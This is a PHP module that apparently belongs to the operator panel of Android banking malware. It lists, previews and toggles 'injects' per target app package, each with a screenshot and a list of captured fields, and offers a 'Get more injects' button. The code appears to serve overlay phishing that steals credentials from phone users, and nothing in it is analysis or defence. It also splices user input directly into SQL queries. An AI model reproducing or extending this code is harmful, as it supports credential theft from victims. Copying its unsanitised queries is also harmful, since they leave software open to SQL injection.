<?php
require_once "cmd_mod.php";

class injects extends modBase
{
	protected $module_name = 'injects';

	function get_filter()
	{
		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			array('appname', 'Package name', 'com.android.vending', modBase::$filters['appname']),
		);
		
		return $this->build_filter($fields);
	}
	
	function get_content()
	{
		$m = $this->client_cfg['db_main'];
		$c = $this->client_cfg['db_name'];
		
		$sql = "select id, inject_id, active from injects";
		if(isset($this->filter_values['appname']) && $this->filter_values['appname'] != '')
		{
			$appname = $this->filter_values['appname'];
			$sql .= " where inject_id = (select id from {$this->client_cfg['db_main']}.injects where app='{$appname}')";
		}
		
		$rows = $this->db->exec($sql, null, true);
		
		$paging = $this->get_limit(sizeof($rows), $this->results_on_page);
		
		$content = "
		<div class='row'>
			<div class='col-md-12' style='font-size: 32pt; text-align: center'>
				<span class='glyphicon glyphicon-pushpin' aria-hidden='true'></span>
				My injects</div>
		</div>
		<div>&nbsp;</div>";
		
		$headers = array("ID", "Package", "Group", "Image", "Fields", "Active");
		$result_rows = array();

		foreach($rows as $record)
		{
			$sql = "select group_id, app, folder from {$m}.injects where id={$record['inject_id']}";
			$row = $this->db->exec($sql, null, true)[0];
			
			$sql = "select title, notes from {$m}.groups where id={$row['group_id']}";
			$group_data = $this->db->exec($sql, null, true)[0];
			
			$inj_path = dirname(__FILE__) . "/../injects/{$row['folder']}/";
			if(!file_exists($inj_path))
				continue;
			
			$fields = '';
			if(file_exists($inj_path . "fields.list"))
			{
				$inj_fields = file($inj_path . "fields.list");
				
				if(sizeof($inj_fields))
					foreach($inj_fields as $f)
						if(trim($f) != '')
							$fields .= "&bull; ". trim($f) . "<br />";
			}
			
			$result_row = array();
			$result_row[] = $record['id'];
			$result_row[] = $row['app'];
			$result_row[] = "{$group_data['notes']}<br /><small style='color: darkblue'>{$group_data['title']}</small>";
			
			$img = file_get_contents($inj_path . "screen.png");
			$result_row[] = "<a href='data:image/png;base64,".base64_encode($img)."' target='_blank'><img title='Click to open full size image' data-toggle='tooltip' alt='' width='200' src='data:image/png;base64,".base64_encode($img)."' style='border: 1px solid black;' /></a>";
			
			$result_row[] = $fields;
			
			if($record['active'])
			{
				$result_row[] = <<<PHP
<button 
	type='button'
	class='btn btn-danger' 
	onclick='ajax_command("panel_disable_inject", {"inject_id": {$record['id']}}, true)'>Disable</button>
PHP;
			}else{
				$result_row[] = <<<PHP
<button 
	type='button'
	class='btn btn-info'
	onclick='ajax_command("panel_enable_inject", {"inject_id": {$record['id']}}, true)'>Enable</button>
PHP;
			}
			
			$result_rows[] = $result_row;
		}

		$content .= $this->get_table($result_rows, $headers);

		$buttons = array(
			array('Get more injects', 'Get more injects', 'go_to_hash("extras", {})', 'info'),
		);
		
		$total = sizeof($rows);
		return $this->wrap_content("Total: {$total}", $content, 0, $buttons);
	}
}
